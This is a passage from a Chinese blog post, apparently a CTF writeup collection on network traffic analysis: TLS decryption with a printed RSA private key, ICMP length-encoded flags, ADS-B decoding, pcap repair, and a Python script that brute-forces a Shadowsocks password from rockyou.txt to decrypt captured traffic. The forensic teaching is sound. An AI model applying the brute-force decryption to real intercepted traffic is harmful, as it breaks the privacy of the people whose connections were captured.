解密完后直接搜索 flag{ 字符串即可找到 flag{e3364403651e775bfb9b3ffa06b69994}

![](imgs/N9.png)

例题-DDCTF2018 流量分析

直接在 TLS 加载 RSA 私钥解密即可

私钥的格式如下：

```
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O&#43;mIQiOUQCvN0HYbj8153JfSQ
LsJIhbRYS7&#43;zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO
vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB
AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4
QGfzYqOn8&#43;Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/
QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN
czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd&#43;F13GBCOQ
ZCM4prBjAkEAz&#43;ENahsEjBE4&#43;7H1HdIaw0&#43;goe/45d6A2ewO/lYH6dDZTAzTW9z9
kzV8uz&#43;Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ&#43;tYBzN
&#43;04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1
AnbJ4Z6opJCGu&#43;UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ&#43;HLJ1/wH
/5pfc3AmEyRdfyx6zwUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH
2STT5qZWzQFz8NRe&#43;/otNOHBR2Xk4e8IS&#43;ehIJ3TvyE=
-----END RSA PRIVATE KEY-----
```

例题2-2024铁三初赛 流量分析

## ICMP流量分析

flag 可能藏在每一帧的长度中

```bash
tshark -r 1.pcapng -Y &#34;icmp&#34; -T fields -e frame.len | uniq &gt; data.txt
```

```python
with open(&#39;data.txt&#39;, &#39;r&#39;) as f:
    data = f.read().split()
flag = &#39;&#39;
for item in data:
    flag &#43;= chr(int(item)-42)
print(flag)
```

例题1-第三届“百越杯”福建省高校网络空间安全大赛-要想会，先学会

## VPN流量分析

### Shadowsocks流量分析

例题-2023强网杯-谍影重重3.0

```python
#请求解密脚本
import hashlib
from Crypto.Cipher import AES


def EVP_BytesToKey(password, key_len, iv_len):
    m = []
    i = 0
    while len(b&#39;&#39;.join(m)) &lt; (key_len &#43; iv_len):
        md5 = hashlib.md5()
        data = password
        if i &gt; 0:
            data = m[i - 1] &#43; password
        md5.update(data)
        m.append(md5.digest())
        i &#43;= 1
    ms = b&#39;&#39;.join(m)
    key = ms[:key_len]
    iv = ms[key_len:key_len &#43; iv_len]
    return key, iv


def decrypt(cipher, password):
    key_len = int(256/8)
    iv_len = 16
    mode = AES.MODE_CFB
    key, _ = EVP_BytesToKey(password, key_len, iv_len)
    cipher = bytes.fromhex(cipher)
    iv = cipher[:iv_len]
    real_cipher = cipher[iv_len:]
    obj = AES.new(key, mode, iv, segment_size=128)
    plain = obj.decrypt(real_cipher)
    return plain


def main():
cipher = &#39;e0a77dfafb6948728ef45033116b34fc855e7ac8570caed829ca9b4c32c2f6f79184e333445c6027e18a6b53253dca03c6c464b8289cb7a16aa1766e6a0325ee842f9a766b81039fe50c5da12dfaa89eacce17b11ba9748899b49b071851040245fa5ea1312180def3d7c0f5af6973433544a8a342e8fcd2b1759086ead124e39a8b3e2f6dc5d56ad7e8548569eae98ec363f87930d4af80e984d0103036a91be4ad76f0cfb00206&#39;
    # 因为password未知，所以我们这里尝试用字典进行爆破
    with open(&#39;rockyou.txt&#39;, &#39;rb&#39;) as f:
        lines = f.readlines()
    for password in lines:
        plain = decrypt(cipher, password.strip())
        if b&#39;HTTP&#39; in plain:
            print(password.decode(), plain.decode())
            break


if __name__ == &#34;__main__&#34;:
    main()
```

### VMess(V2ray)流量分析

#### VMessMD5

【例题：2022强网杯-谍影重重】

#### VMessAEAD

【例题：2024 DubheCTF-authenticated mess &amp; unauthenticated less】

## ADS-B流量分析

飞机/航空器流量，找到流量数据，用pyModeS模块分析即可

例题

**[2023 强网杯] 谍影重重2.0**

下载附件得到一个只有TCP流量的流量包
题目需要我们分析流量包找到飞机的飞机速度和飞机的 ICAO CODE
问了GPT得知飞机常见的协议中有ADS-B，然后在网上找到pyModeS这个模块
在参考链接：https://gitee.com/wangmin-gf/ads-b 看到了与tcp.payload中相似的数据
使用tshark提取出流量包中的数据，然后使用这个脚本批量解密找speed最快的即可

tshark -r attach.pcapng -T fields -e &#34;tcp.payload&#34; | sed &#39;/^\s*$/d&#39; &gt; tshark.txt

```python
import pyModeS
with open(&#34;tshark.txt&#34;) as f:
    data = f.readlines()
    for item in data:
        # print(item.strip())
        if len(item.strip()) != 46:
            continue
        res = pyModeS.tell(item.strip()[18:46])
        print(&#34;===========================================================================&#34;)
```

```bash
===========================================================================
                     Message: 8d79a05e990ccda6f80886dd9544
                ICAO address: 79a05e
             Downlink Format: 17
                    Protocol: Mode-S Extended Squitter (ADS-B)
                        Type: Airborne velocity
                       Speed: 371 knots
                       Track: 213.3474959459136 degrees
               Vertical rate: -64 feet/minute
                        Type: Ground speed
===========================================================================
```

## OICQ协议(QQ协议)

![](imgs/image-20250302192720139.png)

可以分析得到QQ号

## 损坏的流量包分析

例题-第一届“百度杯”信息安全攻防总决赛 find the flag（flag藏在 frame29-41 的 ip.id 字段中）

打开流量包后发现有如下的报错

![](imgs/N10.png)

可以直接使用 [在线网站](https://f00l.de/hacking/pcapfix.php) 修复

修复完成以后就是正常的流量分析了

## 从流量包中找异常流量
一般这种题目的做法就是，观察正常的流量包中的字段，毕竟一个流量包中正常的流量肯定占大多数，
然后结合过滤器，一个字段一个字段地进行排除，就是筛选出不等于正常字段值的流量。

---

> Author: [Lunatic](https://goodlunatic.github.io)  
> URL: https://goodlunatic.github.io/posts/5422d65/  

